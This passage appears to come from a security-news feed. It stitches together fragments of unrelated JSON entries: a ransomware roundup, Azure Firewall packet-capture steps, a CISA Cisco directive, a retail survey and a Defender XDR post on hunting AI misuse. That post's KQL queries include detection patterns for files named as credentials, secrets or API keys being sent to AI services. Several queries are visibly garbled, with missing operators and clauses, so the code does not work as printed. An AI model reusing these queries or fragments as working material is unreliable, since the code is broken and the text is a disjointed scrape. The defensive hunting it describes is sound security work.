included wiping forensic traces with CCleaner, and using Ansible to deploy BlackSuit ransomware across ESXi hosts, encrypting hundreds of VMs and causing major operational disruption. The threat actor Vanilla Tempest conducted a campaign that distributed fake Microsoft Teams installers hosted on look-alike domains. The installers used fraudulently signed certificates, delivering the Oyster backdoor and ultimately Rhysida ransomware. Microsoft disrupted the operation in early October by revoking more than 200 certificates. Qilin affiliates deployed a Linux-based ransomware binary on Windows machines by abusing legitimate remote-management tools (WinSCP, Splashtop, AnyDesk, ScreenConnect) and leveraging BYOVD (Bring Your Own Vulnerable Driver) attacks. In addition, other affiliates used a staged toolkit (SharpDecryptPwd, Mimikatz, NirSoft utilities) plus a WDigest registry tweak to harvest credentials, and exfiltrate data via abused cloud tools like Cyberduck (multipart uploads to Backblaze). Trigona ransomware operators brute-forced exposed MS-SQL servers, embedding malware inside database tables and exporting it to disk via bcp.exe to install payloads (e.g., AnyDesk, Teramind). The actor also deployed Rust-based RDP/MS-SQL scanners, a Go SQL-injection tester (\u201cStressTester\u201d), and custom delete/replace binaries\u2014an automated, SQL -centric intrusion chain that weaponizes legitimate DB tooling for initial access and payload delivery. On October 9, DragonForce posted on the RAMP forum that it is opening its partner program to the public. New affiliates can register and immediately access a suite of free \u201cpartner services,\u201d including professional file analysis/audit, hash decryption, call support, and free victim storage. Registration requires a $500 non-refundable fee; payments accepted in XMR and BTC . The group warned affiliates to follow its rules or face account blocking or free decryptor distribution. On October 18, threat actor Zeta88 \u2014 alleged operator of The Gentlemen ransomware \u2014 announced on RAMP updates to their Windows, Linux and ESXi lockers, adding automatic self-restart and run-on-boot, a silent mode for Windows that encrypts without renaming files and preserves timestamps, and self-spread capabilities across networks/domains using WMI/WMIC, SCHTASKS, SC (Service Control) and PowerShell Remoting. The release also introduced flexible encryption-speed modes, multiple Windows operating modes, and a universal decryptor covering all operating modes. Conclusion The alarming increase in ransomware attacks in October \u2013 and the continual investment in upgrades and innovations by ransomware groups \u2013 highlights the need for security teams to respond with equal vigilance. Basic cybersecurity best practices that can help protect against a wide range of cyber threats include: Prioritizing vulnerabilities based on risk. Protecting web-facing assets. Segmenting networks and critical assets. Hardening endpoints and infrastructure. Strong access controls, allowing no more access than is required, with frequent verification. A strong source of user identity and authentication, including multi-factor. authentication and biometrics, as well as machine authentication with device compliance and health checks. Encryption of data at rest and in transit. Ransomware-resistant backups that are immutable, air-gapped, and isolated as much as possible. Honeypots that lure attackers to fake assets for early breach detection. Proper configuration of APIs and cloud service connections. Monitoring for unusual and anomalous activity with SIEM, Active Directory monitoring, endpoint security, and data loss prevention (DLP) tools. Routinely assessing and confirming controls through audits, vulnerability scanning, and penetration tests. Cyble\u2019s comprehensive attack surface management solutions can help by scanning network and cloud assets for exposures and prioritizing fixes, in addition to monitoring for leaked credentials and other early warning signs of major cyberattacks.

      "summary": "With more data and intelligence than ever, it\u2019s often a challenge to manage it all while making sure you\u2019re maximizing its value for security investigations. We\u2019ve made it easier for customers leveraging Microsoft\u2019s SIEM and XDR. Now, customers can create custom detections that correlate threat intelligence from feeds brought in through the SIEM with their XDR data, without the need to ingest their XDR data as well. Why this matters Traditionally, correlating threat intelligence with endpoint and identity data required ingesting large volumes of XDR data into the SIEM. While effective, this approach often drove up ingestion and retention costs. The new capability eliminates that dependency, allowing security teams to: Reduce costs \u2013 Avoid unnecessary data ingestion charges while still leveraging XDR insights for detection. Accelerate detection \u2013 Query XDR and SIEM data seamlessly in near real time, enabling faster identification of threats. Maintain flexibility \u2013 Use custom detection rules to tailor alerts to your organization\u2019s unique threat landscape. How it works Threat intelligence integration \u2013 Use curated threat indicators from Microsoft or your own threat intelligence platform (TIP) to power detections. Build custom detection rules that query both Sentinel and Defender XDR tables directly. This means you can match threat intelligence indicators\u2014such as malicious IPs, domains, or file hashes (including from third party/non-Microsoft IOCs)\u2014against Defender XDR telemetry without duplicating data in Sentinel. These rules can run on a schedule or in near real time, ensuring timely detection of suspicious activity.

      "title": "Using Packet Capture for troubleshooting Azure Firewall flows",
      "summary": "This blog is written in collaboration with @GustavoModena Introduction Azure Firewall is a cloud-native and intelligent network firewall security service that provides best of breed threat protection for your cloud workloads running in Azure. It\u2019s a fully stateful firewall as a service with built-in high availability and unrestricted cloud scalability. Azure Firewall provides both east-west and north-south traffic inspection, and it is offered in three SKUs: Basic, Standard and Premium. Azure Firewall also brings powerful logs and metrics to monitor your traffic and operations within the firewall. These logs and metrics include Traffic Analysis, Performance and Health Metrics, and Audit Trail. However, there are situations where you may need a comprehensive network packet capture to troubleshoot and investigate an incident reported by users. We are happy to announce that Microsoft just released the new Packet capture feature and it is Generally Available for Azure Firewall. The Packet capture feature in Azure Firewall is intended for troubleshooting purposes and will allow customers and engineers to debug connectivity issues by tracing packets passing through their Azure Firewall. Azure Firewall Packet Capture shows two packets per flow, one for incoming direction and one for outgoing direction , so you can accurately correlate requests and responses during troubleshooting. What is a network packet capture? Network packet capture is a process that involves capturing network packets as they traverse a network interface. It's a valuable tool for network troubleshooting, analysis, and security monitoring. A network packet capture involves intercepting Internet Protocol (IP) packets for analysis and then saving the packets captured to output files, typically saved in the \u201c.pcap\u201d file extension. Network engineers often utilize packet capturing for troubleshooting and monitoring network traffic to identify security threats. In the event of a data breach or other incident, packet captures offer essential forensic evidence that supports investigations. From a malicious actor\u2019s viewpoint, packet captures can be used to steal passwords and other sensitive data. Unlike active reconnaissance techniques like port scanning, packet capturing can be conducted covertly, leaving no trace for investigators. How Does a Packet Capture Work? Packet captures can be performed using networking equipment like routers, firewalls or switches, or even an engineer\u2019s laptop or desktop. Regardless of the method, packet capture involves creating copies of some or all packets passing through a particular point in the network. Capturing packets from a specific device on the network is the simplest way to start troubleshooting, but there are a few caveats. By default, network interfaces only monitor traffic destined for them. For a more comprehensive view of network traffic, you\u2019ll need to set the interface to promiscuous mode or monitor mode. Many routers, firewalls and other network devices have embedded packet capture functions that can be used to quickly troubleshoot directly from the device's admin console. This capability is now available in Azure Firewall. Scenario (VNET to VNET) In this blog we have VM-1 (10.10.0.4) unsuccessfully trying to establish HTTP (TCP 80)/HTTPS (TCP 443) connection to VM-2 (10.10.0.132) via Azure Firewall. Using Azure Firewall Packet Capture to investigate the connection issue In this section, we will use Azure Firewall Packet Capture to understand why an HTTP/HTTPS connection between VM-1 and VM-2 is not working properly. For this demonstration, we are not going to review the rules and Azure Firewall logs, as the purpose of the blog is to demonstrate the new Packet Capture feature, and we are assuming that the Azure Firewall is configured correctly. Let\u2019s start by making sure that we have all the required resources to take the packet captures from Azure Firewall: Azure Firewall with Management NIC enabled Storage account with a container in which you can store the packet captures Once you have all the required resources available, follow the next steps to start running a Packet Capture via Azure Firewall: Create a SAS URL to the container in the storage account: In the Azure Portal go to Storage Account > Containers and select the 3 ellipses at the very right side of the name of the container that you want to use to store the packet captures and select \u201cGenerate SAS\u201d. When defining the parameters of the SAS select \u201cWrite\u201d under Permissions, so Azure Firewall will be able to successfully save the packet captures. Then click on \u201c Generate SAS token and URL \u201d. Now, we must go to the Azure Firewall > Packet Capture (under Help) to start running the packet capture. On the Packet Capture page, provide the following information: Packet capture name - the name of one or more capture files. Output SAS URL - the SAS URL of the storage container you created previously. Next, complete the Basic settings for the packet capture: Maximum number of packets - You should limit the packet capture to a set number of packets. Time limit (seconds) - Since the packet capture is intended for troubleshooting purposes, you should limit the capture time. Protocols - the protocols you want the capture to save (values: Any, TCP, UDP, ICMP). TCP Flags - if TCP or Any is selected, you can select which types of packets to save (values: FIN, SYN, RST, PSH, ACK, URG) If both the Maximum number of packets and Time limit are set, the capture ends when the earliest condition is met. So, either when the maximum number of packets is received or when the time limit is reached. In the Filtering section, you can add the source, destination, and destination ports to include in the capture. You must add at least one filter. The packet capture saves bidirectional traffic that matches each row in the filter section. For the source and destination fields you can list multiple commas separated values in a single filter including IP addresses and IP blocks. Select Run Packet Capture after you're done with your configuration. Once the packet capture is complete, you will navigate to the container used in the storage account and download the pcap files. Note that you will see multiple pcap files, this is because each virtual machine in the backend of the firewall has its own file. Analyzing the Packet Captures When using Azure Firewall Packet Capture, you will always see two packets for every single packet in the flow. This is because the firewall captures both the incoming and outgoing directions of the traffic. Understanding this behavior is critical for accurate troubleshooting, as it ensures you can correlate the original request with its corresponding response. The additional scenarios below will explain how to match these incoming and outgoing flows effectively. To analyze the pcap files you need a network protocol analyzer tool. In this blog we are using Wireshark . Note : The intent of this blog is not to show how to use it nor to do advanced troubleshooting using Wireshark. With the pcap files downloaded to your computer, open the files to start your investigation. Since we have multiple files due to the number of active Azure Firewall instances at the time of the packet capture, it may be easier to merge the files. To merge the pcap files, first open one of them using Wireshark and then go to File > Merge and select the second file. There are different ways to merge them, but here we are using \u201cMerge packets chronologically\u201d. Once the pcap files are merged, you will start your investigation by using filters. In this scenario, we want to investigate why an HTTP request from VM-1 to VM-2 on port TCP 80 is not working, and we are using the following filter: Wireshark filter: tcp.port==80 && tcp.port==50245 && ip.addr==10.10.0.132 (VM-2\u2019s IP address) Ok, so here we can see that VM-1 (10.10.0.4) sends a SYN packet from port 53945 to VM-2 (10.10.0.132) on port 80, then VM-2 sends a reset back to VM-1. This behavior shows us that the traffic is successfully passing through Azure Firewall (allowed), and the issue may possibly be something on VM-2. After involving the application team, they have found an issue related to the IIS configuration and it is now fixed as we can see the TCP request being established on ports 80 and 443 in the screenshot below. Other Scenarios DNAT (Inbound traffic) In this scenario we are connecting from a client via Internet to the Azure Firewall\u2019s public IP, using DNAT rules on port 8443. You can see in the screenshot below the incoming request (TCP 3-way handshake) and all the hops until it gets to the Web Server. L3 (and source IP) differs from the incoming packet since its SNATed at L3 while L4 remains the same. For taking the packet capture in this scenario, we are using the following filters: Source: 71.28.90.56,52.176.62.243,10.10.0.64/26,10.10.0.128/26 Destination: 71.28.90.56,52.176.62.243,10.10.0.64/26,10.10.0.128/26 Destination ports: 8443,443 Check below to understand what each one of the IP/IP ranges and ports are used as filters: Client Public IP: 71.28.90.56 Azure Firewall Public IP: 52.176.62.243 Azure Firewall Instance Private IP: 10.10.0.69 (this IP is included in the IP range 10.10.0.64/26) Web Server Private IP: 10.10.0.132 (this IP is included in the IP range 10.10.0.128/26 Azure Firewall Listening Port: 8443 Web Server Listening (translated) Port: 443 In DNAT scenarios, you will notice two SYN packets for the same flow . SYN 1 represents the incoming packet with its original 5-tuple (source IP, destination IP, source port, destination port, protocol), while SYN 2 corresponds to the same flow but with a different 5-tuple after translation by Azure Firewall. This behavior contrasts with VNET-to-VNET flows, where the 5-tuple remains unchanged. When you are SNATing, connecting to/from the Internet, or processing application rules, to see both incoming and outgoing packets you need to make sure that both Public IP address and subnet address space are included. Internet Access (Outbound traffic) In this scenario, we are connecting from an Azure VM to the public IP via Azure Firewall using Network rules. The screenshot illustrates the TCP three-way handshake followed by the HTTP GET request. Notice two SYN packets: one originating from the client to the destination and another from the Azure Firewall instance IP to the destination. In the first two lines, packets flow from the Azure VM IP to the external public IP, followed by the SNATed packet from the Azure Firewall instance IP to the same external address. For this packet capture, the following filters were applied: Source: 10.10.0.132, 10.10.0.0/26 Destination: 151.101.195.5 Destination ports: 80,443 Check below to understand what each one of the IP/IP ranges and ports are used as filters: Azure VM: 10.10.0.132 Azure Firewall Subnet: 10.10.0.0/26 (10.10.0.5 is the instance IP) External Public IP: 151.101.195.5 External Public IP Port: 80 Application Rule Traffic: In this scenario, we are connecting from an Azure VM to the public IP via Azure Firewall using Application rules. While the original request originates from the VM with source IP 10.0.2.4, the Layer 4 details differ from the incoming packet because, during application rule evaluation, the firewall establishes a new outbound connection acting as a proxy. As shown in the image, the SNAT IP of the Azure Firewall instance (10.0.0.5) initiates the connection to the public IP 140.82.112.4. HTTP or TLS keys can be used to match incoming and outgoing packets. L7 remains the same. For packet capture in this scenario, the following filters are applied: Source: 10.0.2.4, 10.0.0.0/24 Destination: 140.82.112.4 Destination ports: 80,443 Check below to understand what each one of the IP/IP ranges and ports are used as filters: Azure VM: 10.0.2.4 Azure Firewall Subnet: 10.0.0.0/24 (10.10.0.5 is the instance SNAT IP) External Public IP: 140.82.112.4 External Public IP Port: 80,443 VNET to VNET with SNAT: In this scenario, the client VM 10.1.0.4 initiates the connection to the server VM 10.0.2.4 but we have enabled SNAT to happen by default. So, the Firewall\u2019s Private IP 172.16.0.5 (SNAT) will initiate a connection with the destination web server as we can see in the below image. For packet capture in this scenario, the following filters are applied: Source: 10.1.0.4, 172.16.0.0/24 Destination: 10.2.0.4 Destination ports: 80,443 Check below to understand what each one of the IP/IP ranges and ports are used as filters: Azure VM: 10.1.0.4 Azure Firewall Subnet: 172.16.0.0/24 (172.16.0.5 is the instance SNAT IP) Web Server Private IP: 10.2.0.4 Web Server Port: 80 Conclusion The availability of Azure Firewall Packet Capture is crucial for effective network and security troubleshooting. It allows network administrators and security professionals to monitor, analyze, and diagnose network traffic in real-time, providing invaluable insights into potential issues and vulnerabilities. By capturing and examining data packets, they can identify anomalies, detect malicious activities, and ensure the integrity and performance of the network. This proactive approach not only enhances the overall security posture but also minimizes downtime and improves the reliability of network services, making packet capture an indispensable tool in the modern IT landscape.",

      "title": "File Formats",
      "summary": "I'm a huge fan of MS file formats, mostly because they provide for the possibility of an immense (and often untapped, unexploited) amount of metadata. Anyone who's followed me for any length of time, or has read my blog, knows that I'm a huge fan of file formats such as Registry hives (and non-Registry files with the same structure), as well as LNK files. Historically, lots of different MS file formats have contained significant, and often damning, metadata. Anyone remember the issue of MSWord metadata that the Blair administration encountered over two decades ago? I shared some information related to coding, using the file as an exemplar, in the WindowsIR blog. I ran across a LinkedIn post from Maurice Fielenbach , where he talked about an infostealer bundled in an MSI file. Interestingly enough, MSI files are structured storage files, following the OLE format, albeit with different streams, the same as MSWord docs and JumpList files . I'm not a malware RE guy, so I don't have a specialized tool set for parsing these kinds of files. I generally start with the MiTeC Structured Storage Viewer , something I've used before. In the image to the left, you can see the SummaryInformation block parsed and visible in MSSV. If you read through the comments, M alCat is recommended as a tool to use to run or click through the structure of this file format, and others. This looks like a great possibility, and to be honest, if you're into malware analysis, the MalCat blog looks really informative, as well. If you're interested in a sample to work with yourself, I found one at MalwareBazaar . In his LinkedIn post, Maurice said, \"I highly recommend taking a deeper look at the MSI file format itself and familiarizing yourself with common installer frameworks such as WiX.\" I'd agree, particularly given that the test.msi image shows that the creating application was the \"WiX Toolset\". Regardless of the tools you use, and the area of cybersecurity that you're in or focused on, information like this can expand your knowledge base as to what's possible, or by providing new directions for study or skill expansion. This is not only valuable as a malware or DF analyst, but also for threat intel analysts, as this information can add context and granularity to the intel you're developing.",

      "title": "LevelBlue Futures Report: Retail Leaders Reveal Security Concerns",
      "summary": "The future of retail cybersecurity : Explore insights from 220 retail executives on managing AI-driven threats and closing the cyber resilience gap. 44% of retail organizations report a sharp increase in cyberattacks , underscoring the urgent need for stronger cybersecurity defenses across the sector. 34% of retailers experienced a data breach in the past year, revealing the persistent vulnerabilities in retail cybersecurity strategies. The last year has seen the retail sector fixed squarely in the sights of threat actors, as several of the largest attacks involved several of the world\u2019s best known retail brands, including Harrods , Marks & Spencer , and Victoria\u2019s Secret . The 2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector provides context for these attacks, with 44% saying they are experiencing a significantly higher volume of attacks and 34% of retailers surveyed noting that their organization in fact suffered a breach in the last year. These figures are from a worldwide survey of 220 retail executives conducted by LevelBlue earlier this year. The intent was to uncover whether retail organizations are incorporating enterprise-level cyber resilience strategies and to determine their major cybersecurity concerns moving forward. The survey revealed a roller coaster ride of answers with retailers expressing both confidence in their ability to repel certain types of attacks and concern over being unprepared for others. The AI Conundrum The survey made it clear that retail executives are concerned about and expect AI-powered attacks to take place. Showing an odd dichotomy, 49% of those surveyed said they are highly or very highly competent at defending themselves against AI-based attacks, but only 25% go on to say they are prepared to deal with such incidents. Perhaps reflecting their possible overconfidence in their ability to defend against AI attacks, 52% replied that they are highly or very highly competent at implementing and using AI to enhance cybersecurity. The vast majority are so confident in their ability to implement AI-powered security that only 32% are reluctant to implement AI tools and technologies because of possible associated cybersecurity ramifications. Alignment for Success The need for cybersecurity teams to integrate with the organization's lines of business is starting to gain traction, with 44% of the surveyed saying they have effectively aligned business risk appetites with cybersecurity risk management. This is aided by the fact that 49% of the executives noted that communication channels between cybersecurity and line-of-business teams are effective. This level of alignment falls off when it comes to implementing security measures with new projects, as only 37% allocate a cybersecurity budget to new initiatives from the beginning, which is significantly lower than the global average of 46%. A Cybersecurity Culture Gap It is well understood that creating an environment in which all workers understand they are an integral part of their firm\u2019s cybersecurity architecture is essential to building a strong security culture. Unfortunately, the survey found only 40% say they have an effective company-wide cybersecurity culture. One avenue to consider for improving this figure would be using outside expertise to enhance their workforce\u2019s cybersecurity measures. However, only about one-third have engaged external support for training and awareness in the past 12 months, and this figure is not expected to change in the coming years. These are just a few of the dozens of topics covered in the 2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector . The report offers a comprehensive look into how retailers are responding to escalating cyber threats.

Emergency Directive 25-03: Identify and Mitigate Potential Compromise of Cisco Devices , issued on Sept. 25, identified known vulnerabilities CVE-2025-20333 and CVE-2025-20362 , and mandated immediate action to mitigate risks. Threat actors continue to target these devices, posing significant risk to all organizations. The implementation guidance provides information on the minimum software versions that address these vulnerabilities and direct federal agencies to conduct corrective patching measures on devices that are not compliant with these requirements. CISA is aware of multiple organizations that believed they had applied the necessary updates but had not in fact updated to the minimum software version. CISA recommends all organizations verify the correct updates are applied. For agencies with ASA or Firepower devices not yet updated to the necessary software versions or devices that were updated after September 26, 2025, CISA recommends additional actions to mitigate against ongoing and new threat activity. CISA urges all agencies with ASAs and Firepower devices to follow this guidance .

      "title": "The invisible attack surface: hunting AI threats in Defender XDR",
      "summary": "As organizations embed AI across their business, the same technology that drives productivity also introduces a new class of risk: prompts that can be manipulated, data that can be leaked, and AI systems that can be tricked into doing things they shouldn\u2019t. Attackers are already testing these boundaries, and defenders need visibility into how AI is being used - not just where it\u2019s deployed. Microsoft Defender for Cloud now brings that visibility into the hunt. Its AI threat protection detects prompt injection, sensitive data exposure, and misuse of credentials in real time, correlating those signals with endpoint, identity, and cloud telemetry through Microsoft Defender XDR . The result is a single, searchable surface for investigating how both people and AI-driven systems behave under pressure. As of 2025, Defender for AI is fully integrated into Microsoft Defender for Cloud, extending protection to AI models, prompts, and datasets across Azure AI workloads. This makes Defender for Cloud the central platform for securing enterprise AI environments. Meanwhile, Microsoft Defender Experts continues expanding across Defender XDR, offering 24/7 human-led monitoring and investigation, with full active coverage for servers within Defender for Cloud today. For threat hunters, this evolution isn\u2019t theoretical; it\u2019s tactical. The same curiosity and precision that uncover lateral movement or data exfiltration now apply to AI misuse. In this post, we\u2019ll walk through practical KQL hunts to surface suspicious AI activity, from abnormal model usage patterns to subtle signs of data exfiltration that traditional detections might miss. The AI attack surface: old playbook, new players Attackers aren\u2019t reinventing the wheel; they\u2019re repurposing it. The top risks map neatly to the OWASP Top 10 for LLM Applications: Prompt i njection (LLM01) \u2013 Manipulating model logic through crafted inputs or poisoned context Sensitive data disclosure (LLM06) \u2013 AI returning confidential data due to mis-scoped access Shadow AI usage \u2013 Employees using external copilots with corporate data Wallet abuse \u2013 API tokens or service principals driving massive, unintended consumption It\u2019s not about new telemetry; correlation is what matters. Defender surfaces these risks by tying AI alerts from Defender for Cloud to real user behavior across your XDR environment. Threat hunting: from AI alerts to insight Forget slide decks. These are practical, production-ready hunting patterns using real Defender data tables. 1. Shadow AI exfiltration detection Office apps sending data to external AI endpoints (the #1 exfil path today). ( DeviceNetworkEvents | where RemoteUrl has_any (dynamic([\"openai.com\",\"anthropic.com\",\"claude.ai\",\"cohere.ai\",\"chatgpt.com\",\"gemini.google.com\",\"huggingface.co\",\"perplexity.ai\"])) | where InitiatingProcessFileName in~ (dynamic([\"EXCEL.EXE\",\"WINWORD.EXE\",\"OUTLOOK.EXE\",\"POWERPNT.EXE\",\"ONENOTE.EXE\"])) or InitiatingProcessFileName in~ (dynamic([\"chrome.exe\",\"msedge.exe\",\"firefox.exe\",\"brave.exe\"])) | extend Device = toupper(split(DeviceName, \".\")[0]), IsOffice = InitiatingProcessFileName in~ (dynamic([\"EXCEL.EXE\",\"WINWORD.EXE\",\"OUTLOOK.EXE\",\"POWERPNT.EXE\",\"ONENOTE.EXE\"])) | summarize Connections = count(), IsOffice = max(IsOffice), AITime = max(Timestamp) by Device, User = InitiatingProcessAccountName ) | join kind=inner ( DeviceFileEvents | where ActionType in~ (\"FileCopied\",\"FileCreated\",\"FileModified\",\"FileRenamed\") | extend Device = toupper(split(DeviceName, \".\")[0]), Lower = tolower(strcat(FolderPath, FileName)) | extend HeuristicFlag = case( Lower has_any (\"password\",\"credential\",\"secret\",\"api_key\") or Lower endswith \".key\" or Lower endswith \".pem\", \"Credential\", Lower has_any (\"confidential\",\"restricted\",\"classified\",\"sensitive\"), \"Classified\", Lower has_any (\"ssn\",\"salary\",\"payroll\"), \"PII\", Lower has_any (\"finance\",\"hr\",\"legal\",\"executive\"), \"OrgSensitive\", \"Other\" ), LabelFlag = case( SensitivityLabel has \"Highly Confidential\", \"Classified\", SensitivityLabel has \"Confidential\", \"Sensitive\", SensitivityLabel has \"Internal\", \"Internal\", isnotempty(SensitivityLabel), \"Labeled\", \"Unlabeled\" ) | where HeuristicFlag != \"Other\" or LabelFlag in (\"Classified\",\"Sensitive\",\"Internal\",\"Labeled\") | summarize Files = count(), HeuristicCount = countif(HeuristicFlag != \"Other\"), DLPCount = countif(isnotempty(SensitivityLabel)), Types = make_set_if(HeuristicFlag, HeuristicFlag != \"Other\"), Labels = make_set_if(SensitivityLabel, isnotempty(SensitivityLabel)), FileTime = max(Timestamp) by Device, User = InitiatingProcessAccountName ) on Device, User | extend Delta = datetime_diff('minute', AITime, FileTime) | where abs(Delta) = 20, \"High\", \"Medium\" ) | project Priority, Device, User, Connections, Files, HeuristicCount, DLPCount, Types, Labels, Delta | order by Priority desc, Files desc Why it works: Correlates outbound AI traffic with sensitive file access. Action: Block the key, review DLP coverage, fix workflow gaps. 2. Anomalous consumption patterns Off-hours Azure OpenAI activity isn\u2019t necessarily productivity; it might be unsanctioned automation or exfiltration. // Azure OpenAI & LLM Off-Hours Detection - PER USER TIMEZONE // DISCLAIMER: Time zone detection is approximate, based on behavioral inference. // Validate per user/device when high-risk anomalies are flagged. // If authoritative time zone data (e.g., Entra sign-in or mailbox settings) is available, prefer that source. let MinRequestsThreshold = 500; let MinTokensThreshold = 20000; let OffHoursStart = 21; let OffHoursEnd = 5; let UserTimezones = CloudAppEvents | where Timestamp > ago(60d) | where Application has_any (\"OpenAI\", \"Azure OpenAI\", \"ChatGPT\", \"Claude\", \"Gemini\", \"Anthropic\", \"Perplexity\", \"Microsoft 365 Copilot\") | extend HourUTC = datetime_part(\"Hour\", Timestamp) | summarize ActivityByHour = count() by AccountDisplayName, HourUTC | summarize arg_max(ActivityByHour, HourUTC) by AccountDisplayName | extend TimezoneOffset = iff((HourUTC - 14 + 24) % 24 > 12, (HourUTC - 14 + 24) % 24 - 24, (HourUTC - 14 + 24) % 24) | project AccountDisplayName, TimezoneOffset; CloudAppEvents | where Timestamp > ago(30d) | where Application has_any (\"OpenAI\", \"Azure OpenAI\", \"ChatGPT\", \"Claude\", \"Gemini\", \"Anthropic\", \"Perplexity\", \"Microsoft 365 Copilot\") | extend HourUTC = datetime_part(\"Hour\", Timestamp), DayUTC = toint(dayofweek(Timestamp)), Tokens = toint(RawEventData.totalTokens) | join kind=leftouter (UserTimezones) on AccountDisplayName | extend TZ = coalesce(TimezoneOffset, 0) | extend HourLocal = (HourUTC + TZ + 24) % 24 | extend DayLocal = (DayUTC + iff(HourUTC + TZ >= 24, 1, iff(HourUTC + TZ = OffHoursStart or HourLocal = OffHoursStart or HourLocal = MinRequestsThreshold or TokensUsed >= MinTokensThreshold | extend UserTimezone = case( DetectedTZ == 0, \"UTC/GMT\", DetectedTZ == -5, \"EST (UTC-5)\", DetectedTZ == -4, \"EDT (UTC-4)\", DetectedTZ == -6, \"CST (UTC-6)\", DetectedTZ == -7, \"MST (UTC-7)\", DetectedTZ == -8, \"PST (UTC-8)\", DetectedTZ == 1, \"CET (UTC+1)\", DetectedTZ == 8, \"CST China (UTC+8)\", DetectedTZ == 9, \"JST Japan (UTC+9)\", DetectedTZ > 0, strcat(\"UTC+\", DetectedTZ), strcat(\"UTC\", DetectedTZ) ) | extend ThreatPattern = case( array_length(Applications) > 1, \"Multiple LLM Services\", WeekendRequests > LateNightRequests * 2, \"Weekend Automation\", LateNightRequests > WeekendRequests * 2, \"Late-Night Automation\", Requests > 500, \"High-Volume Script\", \"Unusual Off-Hours Activity\" ) | extend RiskScore = case( Requests > 1000 and TokensUsed > 100000, 100, Requests > 500 and WeekendRequests > 100, 95, TokensUsed > 50000 or Requests > 200, 85, WeekendRequests > 100, 80, Requests > 100 or TokensUsed > 20000, 70, 60 ) | extend RiskLevel = case( RiskScore >= 90, \"Critical\", RiskScore >= 75, \"High\", RiskScore >= 60, \"Medium\", \"Low\" ) | project AccountDisplayName, IPAddress, RiskLevel, RiskScore, ThreatPattern, Requests, TokensUsed, WeekendRequests, LateNightRequests, Applications, UserTimezone, LocalHours, LocalDays, ActionTypes, FirstSeen, LastSeen | sort by RiskScore desc, Requests desc Why it works: Humans sleep. Scripts don\u2019t. Temporal anomalies expose automation faster than anomaly models. Action: Check grounding sources, confirm the IP, disable keys or service principals. 3. Bot-like behavior hunt Highlights automation vs. compromise and early detection. // ---- Tunables (adjust if needed) ---- let LookbackDays = 7d; let MinEvents = 3; // ignore trivial users let RPM_AutoThresh = 50.0; // requests/hour threshold that smells like a bot let MaxIPs_Auto = 1; // single IP suggests fixed worker let MaxApps_Auto = 1; // single app suggests fixed worker let MaxUAs_Auto = 2; // very few UAs over lookback let MaxHighTokPct = 5.0; // % of requests over 4k tokens still considered benign CloudAppEvents | where Timestamp > ago(LookbackDays) | where Application has_any (\"OpenAI\", \"Azure OpenAI\", \"Microsoft 365 Copilot Chat\") | extend User = tolower(AccountDisplayName) | extend raw = todynamic(RawEventData) | extend Tokens = toint(coalesce(raw.totalTokens, raw.total_tokens, raw.usage_total_tokens)) | summarize TotalRequests = count(), HighTokenRequests = countif(Tokens > 4000), AvgTokens = avg(Tokens), MaxTokens = max(Tokens), UniqueIPs = dcount(IPAddress), IPs = make_set(IPAddress, 50), UniqueApps = dcount(Application), Apps = make_set(Application, 20), UniqueUAs = dcount(UserAgent), FirstRequest = min(Timestamp), LastRequest = max(Timestamp) by User | where TotalRequests >= MinEvents | extend _dur = toreal(datetime_diff('hour', LastRequest, FirstRequest)) | extend DurationHours = iif(_dur = RPM_AutoThresh and HighTokenRatio 20, IsHighVolume = TotalRequests > 50, IsTokenAbuse = HighTokenRatio > 30, IsMultiService = UniqueApps > 1, IsMultiIP = UniqueIPs > 2, IsEscalating = DurationHours 10 | where IsRapidFire or IsHighVolume or IsTokenAbuse or IsMultiService or IsMultiIP or IsEscalating | extend TechniqueCount = toint(IsRapidFire) + toint(IsHighVolume) + toint(IsTokenAbuse) + toint(IsMultiService) + toint(IsMultiIP) + toint(IsEscalating) | extend Risk = case( IsLikelyAutomation and UniqueIPs == 1 and UniqueApps == 1 and IsTokenAbuse == 0, \"Low - Likely Automation\", TechniqueCount >= 4, \"Critical - Multi-Vector Behavior\", TechniqueCount >= 3, \"High - Attack Pattern\", TechniqueCount >= 2, \"Medium - Anomalous Behavior\", \"Low\" ) // Custom sort: Critical > High > Medium > Low - Likely Automation > Low | extend RiskOrder = case( Risk startswith \"Critical\", 1, Risk startswith \"High\", 2, Risk startswith \"Medium\", 3, Risk == \"Low - Likely Automation\", 4, 5 ) | project Risk, User, TotalRequests, RequestsPerHour, TechniqueCount, IsLikelyAutomation, IsRapidFire, IsHighVolume, IsTokenAbuse, IsMultiIP, IsMultiService, IsEscalating, UniqueIPs, IPs, UniqueApps, UniqueUAs, HighTokenRatio, DurationHours, FirstRequest, LastRequest, RiskOrder | sort by RiskOrder asc, TotalRequests desc Why it works: Hunting automation-like patterns that could indicate either sanctioned scripts or early-stage compromise, enabling proactive detection before alerts fire. Action: Investigate flagged accounts immediately to confirm intent and mitigate potential AI misuse. Operational lessons that scale beyond the lab Custom d etections > Ad hoc hunts \u2013 Turn query #1 into a scheduled detection. Shadow AI isn\u2019t a one-off behavior. Security Copilot \u2260 search bar \u2013 Use it for triage context, not hunting logic. Set quotas, treat them like controls \u2013 Token budgets and rate limits are as critical as firewalls for AI workloads. Defender for Cloud Apps \u2013 Block risky generative AI apps while letting sanctioned copilots run. Getting started with threat hunting for AI workloads Before you run these hunts at scale, make sure your environment is instrumented for cognitive visibility. That means insight into how your AI models are being used and what data they reason over, not just how much compute they consume. Traditional telemetry shows process, network, and authentication events. Cognitive visibility adds prompts, model responses, grounding sources, and token behavior, giving analysts the context that explains why an AI acted the way it did. Defender for AI Services integrates with Defender for Cloud to provide that visibility layer, but the right configuration turns data collection into situational awareness. Enable the AI services plan \u2013 Make sure Defender for AI Services is enabled at the subscription level. This activates continuous monitoring for Azure OpenAI, AI Foundry, and other managed AI workloads. Microsoft Learn \u2192 Enable user prompt evidence \u2013 Turn on prompt capture for Defender for AI alerts. Seeing the exact input and model response during an attack is the difference between speculation and evidence. Microsoft Learn \u2192 Validate your schema \u2013 Always test KQL queries in your workspace. Field names and event structures can differ across tenants and tiers, especially in CloudAuditEvents and AlertEvidence. Use Security Copilot for acceleration \u2013 Let Copilot translate natural language hypotheses into KQL, then fine-tune the logic yourself. It is the fastest way to scale your hunts without losing precision. Microsoft Learn \u2192 Monitor both sides of the equation \u2013 Hunt for both AI-specific risks such as prompt injection, model abuse, or token sprawl, and traditional threats that target AI systems such as compromised credentials, exposed 